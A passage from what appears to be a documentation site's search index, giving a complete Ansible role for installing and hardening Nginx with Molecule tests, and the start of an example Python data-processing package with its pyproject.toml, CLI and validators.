Dependencies\n\nNone.\n\n## Example Playbook\n\n\\```yaml\n- hosts: webservers\n  become: true\n  roles:\n    - role: yourusername.nginx\n      nginx_sites:\n        - name: example.com\n          server_name: example.com www.example.com\n          root: /var/www/example.com\n          ssl_enabled: true\n          ssl_certificate: /etc/ssl/certs/example.com.crt\n          ssl_certificate_key: /etc/ssl/private/example.com.key\n\\```\n\n## Testing\n\nThis role includes Molecule tests:\n\n\\```bash\n## Install dependencies\npip install molecule molecule-docker ansible-lint\n\n## Run tests\nmolecule test\n\\```\n\n## License\n\nMIT\n\n## Author Information\n\nThis role was created by [Your Name](https://github.com/yourusername).\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#metamainyml","title":"meta/main.yml","text":"<pre><code>---\ngalaxy_info:\n  role_name: nginx\n  author: Your Name\n  description: Install and configure Nginx web server\n  company: Your Company\n  license: MIT\n  min_ansible_version: \"2.10\"\n\n  platforms:\n    - name: Ubuntu\n      versions:\n        - focal\n        - jammy\n    - name: Debian\n      versions:\n        - bullseye\n        - bookworm\n    - name: EL\n      versions:\n        - \"8\"\n        - \"9\"\n\n  galaxy_tags:\n    - nginx\n    - web\n    - webserver\n    - ssl\n    - https\n\ndependencies: []\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#defaultsmainyml","title":"defaults/main.yml","text":"<pre><code>---\n## Nginx version\nnginx_version: latest\n\n## Service configuration\nnginx_enabled: true\nnginx_state: started\n\n## User and group (will be set per OS in vars/)\nnginx_user: www-data\nnginx_group: www-data\n\n## Performance tuning\nnginx_worker_processes: auto\nnginx_worker_connections: 1024\nnginx_multi_accept: \"on\"\nnginx_keepalive_timeout: 65\n\n## Buffer sizes\nnginx_client_body_buffer_size: 128k\nnginx_client_max_body_size: 10m\n\n## Logging\nnginx_access_log: /var/log/nginx/access.log\nnginx_error_log: /var/log/nginx/error.log\nnginx_log_level: warn\n\n## SSL/TLS configuration\nnginx_ssl_enabled: true\nnginx_ssl_protocols: \"TLSv1.2 TLSv1.3\"\nnginx_ssl_ciphers: &gt;-\n  ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:\n  ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384\nnginx_ssl_prefer_server_ciphers: \"off\"\nnginx_ssl_session_cache: \"shared:SSL:10m\"\nnginx_ssl_session_timeout: \"10m\"\n\n## Security headers\nnginx_security_headers:\n  X-Frame-Options: \"DENY\"\n  X-Content-Type-Options: \"nosniff\"\n  X-XSS-Protection: \"1; mode=block\"\n  Referrer-Policy: \"no-referrer-when-downgrade\"\n\n## Virtual hosts\nnginx_sites: []\n\n## Remove default site\nnginx_remove_default_site: true\n\n## Configuration paths\nnginx_conf_path: /etc/nginx/nginx.conf\nnginx_sites_available_path: /etc/nginx/sites-available\nnginx_sites_enabled_path: /etc/nginx/sites-enabled\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#varsdebianyml","title":"vars/Debian.yml","text":"<pre><code>---\nnginx_package: nginx\nnginx_service: nginx\nnginx_user: www-data\nnginx_group: www-data\nnginx_conf_path: /etc/nginx/nginx.conf\nnginx_pid_file: /run/nginx.pid\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#varsredhatyml","title":"vars/RedHat.yml","text":"<pre><code>---\nnginx_package: nginx\nnginx_service: nginx\nnginx_user: nginx\nnginx_group: nginx\nnginx_conf_path: /etc/nginx/nginx.conf\nnginx_pid_file: /var/run/nginx.pid\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#tasksmainyml","title":"tasks/main.yml","text":"<pre><code>---\n- name: Include OS-specific variables\n  ansible.builtin.include_vars: \"{{ ansible_os_family }}.yml\"\n  tags: [nginx, always]\n\n- name: Include installation tasks\n  ansible.builtin.include_tasks: install.yml\n  tags: [nginx, nginx-install]\n\n- name: Include configuration tasks\n  ansible.builtin.include_tasks: configure.yml\n  tags: [nginx, nginx-configure]\n\n- name: Include SSL configuration tasks\n  ansible.builtin.include_tasks: ssl.yml\n  when: nginx_ssl_enabled | bool\n  tags: [nginx, nginx-ssl]\n\n- name: Include security tasks\n  ansible.builtin.include_tasks: security.yml\n  tags: [nginx, nginx-security]\n\n- name: Ensure nginx is started and enabled\n  ansible.builtin.service:\n    name: \"{{ nginx_service }}\"\n    state: \"{{ nginx_state }}\"\n    enabled: \"{{ nginx_enabled }}\"\n  tags: [nginx, nginx-service]\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#tasksinstallyml","title":"tasks/install.yml","text":"<pre><code>---\n- name: Update apt cache (Debian)\n  ansible.builtin.apt:\n    update_cache: true\n    cache_valid_time: 3600\n  when: ansible_os_family == 'Debian'\n  tags: [nginx, nginx-install]\n\n- name: Install nginx package\n  ansible.builtin.package:\n    name: \"{{ nginx_package }}\"\n    state: \"{{ 'latest' if nginx_version == 'latest' else 'present' }}\"\n  notify: Restart nginx\n  tags: [nginx, nginx-install]\n\n- name: Ensure nginx configuration directories exist\n  ansible.builtin.file:\n    path: \"{{ item }}\"\n    state: directory\n    owner: root\n    group: root\n    mode: \"0755\"\n  loop:\n    - \"{{ nginx_sites_available_path }}\"\n    - \"{{ nginx_sites_enabled_path }}\"\n  tags: [nginx, nginx-install]\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#tasksconfigureyml","title":"tasks/configure.yml","text":"<pre><code>---\n- name: Deploy nginx main configuration\n  ansible.builtin.template:\n    src: nginx.conf.j2\n    dest: \"{{ nginx_conf_path }}\"\n    owner: root\n    group: root\n    mode: \"0644\"\n    validate: nginx -t -c %s\n  notify: Reload nginx\n  tags: [nginx, nginx-configure]\n\n- name: Remove default site\n  ansible.builtin.file:\n    path: \"{{ nginx_sites_enabled_path }}/default\"\n    state: absent\n  when: nginx_remove_default_site | bool\n  notify: Reload nginx\n  tags: [nginx, nginx-configure]\n\n- name: Configure virtual hosts\n  ansible.builtin.template:\n    src: site.conf.j2\n    dest: \"{{ nginx_sites_available_path }}/{{ item.name }}.conf\"\n    owner: root\n    group: root\n    mode: \"0644\"\n  loop: \"{{ nginx_sites }}\"\n  notify: Reload nginx\n  tags: [nginx, nginx-configure, nginx-sites]\n\n- name: Enable virtual hosts\n  ansible.builtin.file:\n    src: \"{{ nginx_sites_available_path }}/{{ item.name }}.conf\"\n    dest: \"{{ nginx_sites_enabled_path }}/{{ item.name }}.conf\"\n    state: link\n  loop: \"{{ nginx_sites }}\"\n  notify: Reload nginx\n  tags: [nginx, nginx-configure, nginx-sites]\n\n- name: Ensure document roots exist\n  ansible.builtin.file:\n    path: \"{{ item.root }}\"\n    state: directory\n    owner: \"{{ nginx_user }}\"\n    group: \"{{ nginx_group }}\"\n    mode: \"0755\"\n  loop: \"{{ nginx_sites }}\"\n  when: item.root is defined\n  tags: [nginx, nginx-configure, nginx-sites]\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#taskssslyml","title":"tasks/ssl.yml","text":"<pre><code>---\n- name: Ensure SSL directory exists\n  ansible.builtin.file:\n    path: /etc/nginx/ssl\n    state: directory\n    owner: root\n    group: root\n    mode: \"0755\"\n  tags: [nginx, nginx-ssl]\n\n- name: Deploy SSL configuration\n  ansible.builtin.template:\n    src: ssl.conf.j2\n    dest: /etc/nginx/ssl/ssl.conf\n    owner: root\n    group: root\n    mode: \"0644\"\n  notify: Reload nginx\n  tags: [nginx, nginx-ssl]\n\n- name: Check SSL certificates exist\n  ansible.builtin.stat:\n    path: \"{{ item.ssl_certificate }}\"\n  loop: \"{{ nginx_sites }}\"\n  when:\n    - item.ssl_enabled is defined\n    - item.ssl_enabled | bool\n  register: ssl_certs\n  failed_when: false\n  tags: [nginx, nginx-ssl]\n\n- name: Warn about missing SSL certificates\n  ansible.builtin.debug:\n    msg: \"Warning: SSL certificate not found: {{ item.item.ssl_certificate }}\"\n  loop: \"{{ ssl_certs.results }}\"\n  when:\n    - item.stat is defined\n    - not item.stat.exists\n  tags: [nginx, nginx-ssl]\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#taskssecurityyml","title":"tasks/security.yml","text":"<pre><code>---\n- name: Set proper permissions on nginx directories\n  ansible.builtin.file:\n    path: \"{{ item }}\"\n    state: directory\n    owner: root\n    group: root\n    mode: \"0755\"\n  loop:\n    - /etc/nginx\n    - /var/log/nginx\n  tags: [nginx, nginx-security]\n\n- name: Ensure nginx user has minimal privileges\n  ansible.builtin.user:\n    name: \"{{ nginx_user }}\"\n    shell: /usr/sbin/nologin\n    system: true\n    create_home: false\n  tags: [nginx, nginx-security]\n\n- name: Configure firewall for HTTP/HTTPS (UFW)\n  community.general.ufw:\n    rule: allow\n    port: \"{{ item }}\"\n    proto: tcp\n  loop:\n    - \"80\"\n    - \"443\"\n  when:\n    - ansible_os_family == 'Debian'\n    - nginx_configure_firewall | default(false) | bool\n  tags: [nginx, nginx-security, nginx-firewall]\n\n- name: Configure firewall for HTTP/HTTPS (firewalld)\n  ansible.posix.firewalld:\n    service: \"{{ item }}\"\n    permanent: true\n    state: enabled\n  loop:\n    - http\n    - https\n  when:\n    - ansible_os_family == 'RedHat'\n    - nginx_configure_firewall | default(false) | bool\n  notify: Reload firewalld\n  tags: [nginx, nginx-security, nginx-firewall]\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#handlersmainyml","title":"handlers/main.yml","text":"<pre><code>---\n- name: Restart nginx\n  ansible.builtin.service:\n    name: \"{{ nginx_service }}\"\n    state: restarted\n\n- name: Reload nginx\n  ansible.builtin.service:\n    name: \"{{ nginx_service }}\"\n    state: reloaded\n\n- name: Reload firewalld\n  ansible.builtin.service:\n    name: firewalld\n    state: reloaded\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#templatesnginxconfj2","title":"templates/nginx.conf.j2","text":"<pre><code>user {{ nginx_user }} {{ nginx_group }};\nworker_processes {{ nginx_worker_processes }};\npid {{ nginx_pid_file }};\nerror_log {{ nginx_error_log }} {{ nginx_log_level }};\n\nevents {\n    worker_connections {{ nginx_worker_connections }};\n    multi_accept {{ nginx_multi_accept }};\n}\n\nhttp {\n    # Basic Settings\n    sendfile on;\n    tcp_nopush on;\n    tcp_nodelay on;\n    keepalive_timeout {{ nginx_keepalive_timeout }};\n    types_hash_max_size 2048;\n    server_tokens off;\n\n    # Buffer Sizes\n    client_body_buffer_size {{ nginx_client_body_buffer_size }};\n    client_max_body_size {{ nginx_client_max_body_size }};\n\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    # Logging\n    access_log {{ nginx_access_log }};\n\n    # Gzip Settings\n    gzip on;\n    gzip_vary on;\n    gzip_proxied any;\n    gzip_comp_level 6;\n    gzip_types text/plain text/css text/xml text/javascript\n               application/json application/javascript application/xml+rss\n               application/rss+xml font/truetype font/opentype\n               application/vnd.ms-fontobject image/svg+xml;\n    gzip_disable \"msie6\";\n\n{% if nginx_ssl_enabled %}\n    # SSL Settings\n    include /etc/nginx/ssl/ssl.conf;\n{% endif %}\n\n    # Virtual Host Configurations\n    include {{ nginx_sites_enabled_path }}/*;\n}\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#templatessiteconfj2","title":"templates/site.conf.j2","text":"<pre><code>{% if item.ssl_enabled | default(false) %}\n## Redirect HTTP to HTTPS\nserver {\n    listen 80;\n    listen [::]:80;\n    server_name {{ item.server_name }};\n    return 301 https://$server_name$request_uri;\n}\n\nserver {\n    listen 443 ssl http2;\n    listen [::]:443 ssl http2;\n    server_name {{ item.server_name }};\n\n    ssl_certificate {{ item.ssl_certificate }};\n    ssl_certificate_key {{ item.ssl_certificate_key }};\n\n{% else %}\nserver {\n    listen 80;\n    listen [::]:80;\n    server_name {{ item.server_name }};\n{% endif %}\n\n    root {{ item.root }};\n    index index.html index.htm index.nginx-debian.html;\n\n    # Security Headers\n{% for header, value in nginx_security_headers.items() %}\n    add_header {{ header }} \"{{ value }}\" always;\n{% endfor %}\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n\n    # Deny access to hidden files\n    location ~ /\\. {\n        deny all;\n    }\n\n    # Custom error pages\n    error_page 404 /404.html;\n    error_page 500 502 503 504 /50x.html;\n\n    # Access and error logs\n    access_log /var/log/nginx/{{ item.name }}_access.log;\n    error_log /var/log/nginx/{{ item.name }}_error.log;\n}\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#templatessslconfj2","title":"templates/ssl.conf.j2","text":"<pre><code>## SSL Protocols and Ciphers\nssl_protocols {{ nginx_ssl_protocols }};\nssl_ciphers {{ nginx_ssl_ciphers }};\nssl_prefer_server_ciphers {{ nginx_ssl_prefer_server_ciphers }};\n\n## SSL Session\nssl_session_cache {{ nginx_ssl_session_cache }};\nssl_session_timeout {{ nginx_ssl_session_timeout }};\nssl_session_tickets off;\n\n## OCSP Stapling\nssl_stapling on;\nssl_stapling_verify on;\nresolver 8.8.8.8 8.8.4.4 valid=300s;\nresolver_timeout 5s;\n\n## Security Headers\nadd_header Strict-Transport-Security \"max-age=63072000\" always;\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#moleculedefaultmoleculeyml","title":"molecule/default/molecule.yml","text":"<pre><code>---\ndependency:\n  name: galaxy\n\ndriver:\n  name: docker\n\nplatforms:\n  - name: ubuntu-22\n    image: geerlingguy/docker-ubuntu2204-ansible:latest\n    command: \"\"\n    volumes:\n      - /sys/fs/cgroup:/sys/fs/cgroup:rw\n    cgroupns_mode: host\n    privileged: true\n    pre_build_image: true\n\n  - name: debian-12\n    image: geerlingguy/docker-debian12-ansible:latest\n    command: \"\"\n    volumes:\n      - /sys/fs/cgroup:/sys/fs/cgroup:rw\n    cgroupns_mode: host\n    privileged: true\n    pre_build_image: true\n\nprovisioner:\n  name: ansible\n  config_options:\n    defaults:\n      callbacks_enabled: profile_tasks, timer, yaml\n  playbooks:\n    converge: converge.yml\n\nverifier:\n  name: ansible\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#moleculedefaultconvergeyml","title":"molecule/default/converge.yml","text":"<pre><code>---\n- name: Converge\n  hosts: all\n  become: true\n\n  vars:\n    nginx_sites:\n      - name: test-site\n        server_name: test.example.com\n        root: /var/www/test-site\n        ssl_enabled: false\n\n  roles:\n    - role: ansible-role-nginx\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#moleculedefaultverifyyml","title":"molecule/default/verify.yml","text":"<pre><code>---\n- name: Verify\n  hosts: all\n  become: true\n\n  tasks:\n    - name: Check nginx is installed\n      ansible.builtin.package_facts:\n        manager: auto\n\n    - name: Assert nginx package is installed\n      ansible.builtin.assert:\n        that:\n          - \"'nginx' in ansible_facts.packages\"\n\n    - name: Check nginx service is running\n      ansible.builtin.service_facts:\n\n    - name: Assert nginx service is running\n      ansible.builtin.assert:\n        that:\n          - ansible_facts.services['nginx.service'].state == 'running'\n\n    - name: Check nginx is listening on port 80\n      ansible.builtin.wait_for:\n        port: 80\n        timeout: 10\n\n    - name: Check nginx configuration is valid\n      ansible.builtin.command: nginx -t\n      changed_when: false\n\n    - name: Check test site is configured\n      ansible.builtin.stat:\n        path: /etc/nginx/sites-enabled/test-site.conf\n      register: test_site\n\n    - name: Assert test site configuration exists\n      ansible.builtin.assert:\n        that:\n          - test_site.stat.exists\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#yamllint","title":".yamllint","text":"<pre><code>---\nextends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  truthy:\n    allowed-values: ['true', 'false', 'yes', 'no']\n</code></pre>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/ansible_role_example/#key-features-demonstrated","title":"Key Features Demonstrated","text":"<p>This complete Ansible role example demonstrates:</p> <ol> <li>Multi-OS Support: Variables per OS family (Debian/RedHat)</li> <li>Idempotency: All tasks are idempotent and can be run multiple times</li> <li>Templating: Jinja2 templates for nginx configuration</li> <li>Handlers: Restart/reload nginx only when configuration changes</li> <li>Variables: Defaults, vars, and role variables with proper precedence</li> <li>Tasks Organization: Separate task files for logical grouping</li> <li>Tags: Granular control over which tasks to run</li> <li>Validation: nginx -t validation before applying configuration</li> <li>Security: Security headers, SSL configuration, minimal privileges</li> <li>Testing: Molecule tests with Docker for automated validation</li> <li>Documentation: Comprehensive README with examples</li> <li>Metadata: Galaxy metadata for role distribution</li> </ol> <p>The role is production-ready and follows Ansible best practices for reusability and maintainability.</p> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["ansible","role","example","nginx","best-practices","complete"]},{"location":"05_examples/python_package_example/","title":"Complete Python Package Example","text":"","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#overview","title":"Overview","text":"<p>This is a complete, working example of a modern Python package called dataproc - a data processing library. It demonstrates all best practices from the Python Package Template, including project structure, type hints, testing, documentation, and CI/CD integration.</p> <p>Package Purpose: A simple data processing library that validates, transforms, and exports data in various formats.</p>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#project-structure","title":"Project Structure","text":"<pre><code>dataproc/\n\u251c\u2500\u2500 src/\n\u2502   \u2514\u2500\u2500 dataproc/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u251c\u2500\u2500 __main__.py\n\u2502       \u251c\u2500\u2500 core.py\n\u2502       \u251c\u2500\u2500 validators.py\n\u2502       \u251c\u2500\u2500 transformers.py\n\u2502       \u251c\u2500\u2500 exporters.py\n\u2502       \u2514\u2500\u2500 py.typed\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 conftest.py\n\u2502   \u251c\u2500\u2500 test_core.py\n\u2502   \u251c\u2500\u2500 test_validators.py\n\u2502   \u251c\u2500\u2500 test_transformers.py\n\u2502   \u2514\u2500\u2500 test_exporters.py\n\u251c\u2500\u2500 docs/\n\u2502   \u251c\u2500\u2500 index.md\n\u2502   \u251c\u2500\u2500 api.md\n\u2502   \u2514\u2500\u2500 examples.md\n\u251c\u2500\u2500 .github/\n\u2502   \u2514\u2500\u2500 workflows/\n\u2502       \u2514\u2500\u2500 ci.yml\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 CHANGELOG.md\n\u251c\u2500\u2500 .gitignore\n\u251c\u2500\u2500 .pre-commit-config.yaml\n\u2514\u2500\u2500 Makefile\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#pyprojecttoml","title":"pyproject.toml","text":"<pre><code>[build-system]\nrequires = [\"setuptools&gt;=68.0\", \"wheel\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"dataproc\"\nversion = \"1.0.0\"\ndescription = \"A modern data processing library with validation and export capabilities\"\nreadme = \"README.md\"\nauthors = [\n    {name = \"Tyler Dukes\", email = \"tyler@example.com\"}\n]\nlicense = {text = \"MIT\"}\nclassifiers = [\n    \"Development Status :: 4 - Beta\",\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.10\",\n    \"Programming Language :: Python :: 3.11\",\n    \"Programming Language :: Python :: 3.12\",\n    \"Topic :: Software Development :: Libraries :: Python Modules\",\n]\nkeywords = [\"data\", \"processing\", \"validation\", \"export\"]\nrequires-python = \"&gt;=3.10\"\ndependencies = [\n    \"pydantic&gt;=2.5.0\",\n    \"pandas&gt;=2.1.0\",\n]\n\n[project.optional-dependencies]\ndev = [\n    \"pytest&gt;=7.4.0\",\n    \"pytest-cov&gt;=4.1.0\",\n    \"black&gt;=23.12.0\",\n    \"ruff&gt;=0.1.9\",\n    \"mypy&gt;=1.8.0\",\n    \"pre-commit&gt;=3.6.0\",\n]\ndocs = [\n    \"mkdocs&gt;=1.5.0\",\n    \"mkdocs-material&gt;=9.5.0\",\n]\n\n[project.urls]\nHomepage = \"https://github.com/tydukes/dataproc\"\nDocumentation = \"https://dataproc.readthedocs.io\"\nRepository = \"https://github.com/tydukes/dataproc\"\nIssues = \"https://github.com/tydukes/dataproc/issues\"\n\n[project.scripts]\ndataproc = \"dataproc.__main__:main\"\n\n[tool.setuptools]\npackage-dir = {\"\" = \"src\"}\n\n[tool.setuptools.packages.find]\nwhere = [\"src\"]\ninclude = [\"dataproc*\"]\n\n[tool.setuptools.package-data]\ndataproc = [\"py.typed\"]\n\n[tool.black]\nline-length = 100\ntarget-version = [\"py310\", \"py311\", \"py312\"]\n\n[tool.ruff]\nline-length = 100\ntarget-version = \"py310\"\nselect = [\"E\", \"W\", \"F\", \"I\", \"B\", \"C4\", \"UP\"]\n\n[tool.ruff.isort]\nknown-first-party = [\"dataproc\"]\n\n[tool.mypy]\npython_version = \"3.10\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\ndisallow_incomplete_defs = true\n\n[tool.pytest.ini_options]\ntestpaths = [\"tests\"]\naddopts = [\"--verbose\", \"--cov=dataproc\", \"--cov-report=term-missing\", \"--cov-report=xml\"]\n\n[tool.coverage.run]\nsource = [\"src\"]\nomit = [\"tests/*\"]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"def __repr__\",\n    \"raise NotImplementedError\",\n    \"if TYPE_CHECKING:\",\n]\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataprocinitpy","title":"src/dataproc/init.py","text":"<pre><code>\"\"\"DataProc - A modern data processing library.\"\"\"\n\nfrom dataproc.core import DataProcessor\nfrom dataproc.exporters import CSVExporter, JSONExporter\nfrom dataproc.transformers import clean_text, normalize_numeric\nfrom dataproc.validators import EmailValidator, RangeValidator\n\n__version__ = \"1.0.0\"\n__all__ = [\n    \"DataProcessor\",\n    \"CSVExporter\",\n    \"JSONExporter\",\n    \"clean_text\",\n    \"normalize_numeric\",\n    \"EmailValidator\",\n    \"RangeValidator\",\n]\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataprocmainpy","title":"src/dataproc/main.py","text":"<pre><code>\"\"\"CLI entry point for dataproc.\"\"\"\n\nimport argparse\nimport sys\nfrom pathlib import Path\nfrom typing import Optional\n\nfrom dataproc import __version__\nfrom dataproc.core import DataProcessor\nfrom dataproc.exporters import CSVExporter, JSONExporter\n\ndef parse_args(args: Optional[list[str]] = None) -&gt; argparse.Namespace:\n    \"\"\"Parse command line arguments.\"\"\"\n    parser = argparse.ArgumentParser(\n        prog=\"dataproc\",\n        description=\"Process and validate data with various export formats\",\n    )\n\n    parser.add_argument(\n        \"--version\",\n        action=\"version\",\n        version=f\"%(prog)s {__version__}\",\n    )\n\n    parser.add_argument(\n        \"input_file\",\n        type=Path,\n        help=\"Input CSV file to process\",\n    )\n\n    parser.add_argument(\n        \"-o\",\n        \"--output\",\n        type=Path,\n        help=\"Output file path\",\n    )\n\n    parser.add_argument(\n        \"-f\",\n        \"--format\",\n        choices=[\"csv\", \"json\"],\n        default=\"csv\",\n        help=\"Output format (default: csv)\",\n    )\n\n    parser.add_argument(\n        \"-v\",\n        \"--verbose\",\n        action=\"store_true\",\n        help=\"Enable verbose output\",\n    )\n\n    return parser.parse_args(args)\n\ndef main(args: Optional[list[str]] = None) -&gt; int:\n    \"\"\"Main CLI entry point.\"\"\"\n    parsed_args = parse_args(args)\n\n    if not parsed_args.input_file.exists():\n        print(f\"Error: Input file not found: {parsed_args.input_file}\", file=sys.stderr)\n        return 1\n\n    try:\n        # Initialize processor\n        processor = DataProcessor()\n\n        # Load and process data\n        if parsed_args.verbose:\n            print(f\"Loading data from {parsed_args.input_file}\")\n\n        data = processor.load_csv(parsed_args.input_file)\n\n        if parsed_args.verbose:\n            print(f\"Loaded {len(data)} records\")\n\n        # Validate data\n        validation_result = processor.validate(data)\n        if not validation_result.is_valid:\n            print(f\"Validation failed: {validation_result.errors}\", file=sys.stderr)\n            return 1\n\n        # Export data\n        output_path = parsed_args.output or parsed_args.input_file.with_suffix(\n            f\".processed.{parsed_args.format}\"\n        )\n\n        if parsed_args.format == \"csv\":\n            exporter = CSVExporter()\n        else:\n            exporter = JSONExporter()\n\n        exporter.export(data, output_path)\n\n        if parsed_args.verbose:\n            print(f\"Data exported to {output_path}\")\n\n        return 0\n\n    except Exception as e:\n        print(f\"Error: {e}\", file=sys.stderr)\n        return 1\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataproccorepy","title":"src/dataproc/core.py","text":"<pre><code>\"\"\"Core data processing functionality.\"\"\"\n\nfrom pathlib import Path\nfrom typing import Any\n\nimport pandas as pd\nfrom pydantic import BaseModel, Field\n\nclass ValidationResult(BaseModel):\n    \"\"\"Result of data validation.\"\"\"\n\n    is_valid: bool = Field(description=\"Whether validation passed\")\n    errors: list[str] = Field(default_factory=list, description=\"List of validation errors\")\n    warnings: list[str] = Field(default_factory=list, description=\"List of warnings\")\n\nclass DataProcessor:\n    \"\"\"Main data processor class.\n\n    Handles loading, validation, transformation, and export of data.\n    \"\"\"\n\n    def __init__(self) -&gt; None:\n        \"\"\"Initialize DataProcessor.\"\"\"\n        self.data: pd.DataFrame | None = None\n\n    def load_csv(self, file_path: Path) -&gt; pd.DataFrame:\n        \"\"\"Load data from CSV file.\n\n        Args:\n            file_path: Path to CSV file\n\n        Returns:\n            Loaded DataFrame\n\n        Raises:\n            FileNotFoundError: If file doesn't exist\n            ValueError: If file is invalid\n        \"\"\"\n        if not file_path.exists():\n            raise FileNotFoundError(f\"File not found: {file_path}\")\n\n        try:\n            self.data = pd.read_csv(file_path)\n            return self.data\n        except Exception as e:\n            raise ValueError(f\"Failed to load CSV: {e}\")\n\n    def validate(self, data: pd.DataFrame) -&gt; ValidationResult:\n        \"\"\"Validate data.\n\n        Args:\n            data: DataFrame to validate\n\n        Returns:\n            ValidationResult with validation status and errors\n        \"\"\"\n        errors = []\n        warnings = []\n\n        # Check for empty data\n        if data.empty:\n            errors.append(\"Data is empty\")\n\n        # Check for missing values\n        missing_counts = data.isnull().sum()\n        for column, count in missing_counts.items():\n            if count &gt; 0:\n                warnings.append(f\"Column '{column}' has {count} missing values\")\n\n        # Check for duplicate rows\n        duplicates = data.duplicated().sum()\n        if duplicates &gt; 0:\n            warnings.append(f\"Found {duplicates} duplicate rows\")\n\n        return ValidationResult(\n            is_valid=len(errors) == 0,\n            errors=errors,\n            warnings=warnings,\n        )\n\n    def transform(self, data: pd.DataFrame, operations: list[str]) -&gt; pd.DataFrame:\n        \"\"\"Transform data with specified operations.\n\n        Args:\n            data: DataFrame to transform\n            operations: List of transformation operations\n\n        Returns:\n            Transformed DataFrame\n        \"\"\"\n        result = data.copy()\n\n        for operation in operations:\n            if operation == \"drop_duplicates\":\n                result = result.drop_duplicates()\n            elif operation == \"drop_na\":\n                result = result.dropna()\n            elif operation == \"reset_index\":\n                result = result.reset_index(drop=True)\n\n        return result\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataprocvalidatorspy","title":"src/dataproc/validators.py","text":"<pre><code>\"\"\"Data validation utilities.\"\"\"\n\nimport re\nfrom abc import ABC, abstractmethod\nfrom typing import Any\n\nclass Validator(ABC):\n    \"\"\"Base validator class.\"\"\"\n\n    @abstractmethod\n    def validate(self, value: Any) -&gt; bool:\n        \"\"\"Validate a value.\n\n        Args:\n            value: Value to validate\n\n        Returns:\n            True if valid, False otherwise\n        \"\"\"\n        pass\n\nclass EmailValidator(Validator):\n    \"\"\"Validate email addresses.\"\"\"\n\n    EMAIL_REGEX = re.compile(r\"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$\")\n\n    def validate(self, value: Any) -&gt; bool:\n        \"\"\"Validate email address.\n\n        Args:\n            value: Email to validate\n\n        Returns:\n            True if valid email, False otherwise\n        \"\"\"\n        if not isinstance(value, str):\n            return False\n\n        return bool(self.EMAIL_REGEX.match(value))\n\nclass RangeValidator(Validator):\n    \"\"\"Validate numeric values within range.\"\"\"\n\n    def __init__(self, min_value: float, max_value: float) -&gt; None:\n        \"\"\"Initialize RangeValidator.\n\n        Args:\n            min_value: Minimum allowed value\n            max_value: Maximum allowed value\n        \"\"\"\n        self.min_value = min_value\n        self.max_value = max_value\n\n    def validate(self, value: Any) -&gt; bool:\n        \"\"\"Validate value is within range.\n\n        Args:\n            value: Value to validate\n\n        Returns:\n            True if within range, False otherwise\n        \"\"\"\n        try:\n            numeric_value = float(value)\n            return self.min_value &lt;= numeric_value &lt;= self.max_value\n        except (TypeError, ValueError):\n            return False\n</code></pre>","tags":["python","package","example","best-practices","complete"]},{"location":"05_examples/python_package_example/#srcdataproctransformerspy","title":"src/dataproc/transformers.py","text":"<pre><code>\"\"\"Data transformation utilities.\"\"\"\n\nimport re\n\ndef clean_text(text: str) -&gt; 